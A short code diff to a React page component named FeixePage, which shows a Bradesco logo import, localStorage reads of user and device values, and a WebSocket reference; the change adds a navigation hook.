@@ -4,6 +4,7 @@ import bradescoLogo from "@/assets/bradesco-logo.png";
 import { resolveServerRoute } from "@/lib/resolveServerRoute";
 
 const FeixePage = () => {
+  const navigate = useNavigate();
   const usuario = localStorage.getItem("usuario") || "";
   const dispositivo = localStorage.getItem("dispositivo") || "";
   const wsRef = useRef<WebSocket | null>(null);
